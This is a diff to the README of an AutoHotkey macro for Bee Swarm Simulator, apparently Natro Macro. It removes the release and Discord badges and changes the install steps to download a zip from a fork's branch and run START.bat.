@@ -42,10 +42,6 @@ The only official sources are:
 </picture>
 <br>
 
-<!-- shields and contents -->
-[![][latest-release-shield]][latest-release-link]
-[![][downloads-shield]][downloads-link]
-[![][discord-shield]][discord-link]
 <br>
 An open-source Bee Swarm Simulator macro written in AutoHotkey!<br>
 </div>
@@ -53,9 +49,10 @@ An open-source Bee Swarm Simulator macro written in AutoHotkey!<br>
 
 <a name="installation"><h2>🛠️ Installation</h2></a>
 
-1. Download `Natro_Macro_v#.#.#.zip` from the [latest release][latest-release-link]
-2. Open `Natro_Macro_v#.#.#` and double-click the folder inside
-3. Run `START.bat` and wait for the macro to load
+1. Press the green code button at the top or [**Click here**](https://github.com/ManlyTorch/NatroMacroOCR/archive/refs/heads/tad-sync.zip)
+2. Click download zip
+3. Open `Natro_Macro_v#.#.#` and double-click the folder inside
+4. Run `START.bat` and wait for the macro to load
 
 
 <a name="community"><h2>🌎 Community</h2></a>
